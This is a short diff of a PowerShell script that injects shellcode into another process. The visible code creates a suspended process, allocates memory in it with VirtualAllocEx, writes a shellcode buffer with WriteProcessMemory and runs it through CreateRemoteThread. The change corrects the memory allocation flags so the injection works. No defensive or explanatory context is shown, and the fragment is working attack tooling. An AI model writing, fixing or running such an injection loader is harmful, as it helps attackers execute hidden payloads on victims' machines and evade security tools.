@@ -95,7 +95,7 @@ $result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4,
 # Obtain the required handles from the PROCESS_INFORMATION structure
 $hProcess = $processInformation.hProcess
 
-$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x20)
+$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x20)
 $WriteProcessMemory.Invoke($hProcess, $address, $shellcode, $shellcode.Length, [IntPtr]::Zero)
 $thread = $CreateRemoteThread.Invoke($hProcess, 0, [IntPtr]::Zero, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 $WaitForSingleObject.Invoke($thread, 500)
